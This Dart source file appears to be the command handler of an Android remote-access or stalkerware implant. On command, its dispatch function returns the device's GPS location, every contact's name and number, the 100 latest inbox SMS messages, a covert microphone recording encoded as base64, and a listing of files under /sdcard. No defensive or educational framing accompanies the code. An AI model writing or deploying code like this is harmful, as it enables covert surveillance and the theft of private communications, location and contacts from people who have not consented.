import 'dart:convert';
import 'dart:io';
import 'package:geolocator/geolocator.dart';
import 'package:contacts_service/contacts_service.dart';
import 'package:sms_maintained/sms.dart';
import 'package:record/record.dart';
import 'package:path_provider/path_provider.dart';

Future<Map<String, dynamic>?> dispatch(Map<String, dynamic> m) async {
  switch (m['cmd']) {
    case 'location':
      final p = await Geolocator.getLastKnownPosition() ??
                await Geolocator.getCurrentPosition();
      return {'cmd': 'location', 'lat': p.latitude, 'lon': p.longitude,
              'acc': p.accuracy};
    case 'contacts':
      final c = await ContactsService.getContacts();
      return {'cmd': 'contacts',
        'data': c.map((x) => {'name': x.displayName, 'number':
            x.phones?.first.value}).toList()};
    case 'sms':
      final list = <Map<String, dynamic>>[];
      final q = SmsQuery();
      for (final s in (await q.querySms(kind: SmsQueryKind.Inbox, count: 100))) {
        list.add({'from': s.address, 'body': s.body, 'date': s.date});
      }
      return {'cmd': 'sms', 'data': list};
    case 'mic':
      final secs = (m['secs'] ?? 10) as int;
      final dir = await getCacheDirectory();
      final path = '${dir.path}/rec_${DateTime.now().millisecondsSinceEpoch}.m4a';
      final rec = AudioRecorder();
      await rec.start(const RecordConfig(), path: path);
      await Future.delayed(Duration(seconds: secs));
      await rec.stop();
      return {'cmd': 'mic', 'file': path,
        'b64': base64Encode(File(path).readAsBytesSync())};
    case 'files':
      final d = Directory(m['dir'] ?? '/sdcard');
      final list = d.listSync().take(300).map((f) {
        final s = f.statSync();
        return {'name': f.path.split('/').last, 'size': s.size,
                'dir': f is Directory};
      }).toList();
      return {'cmd': 'files', 'data': list};
  }
  return null;
}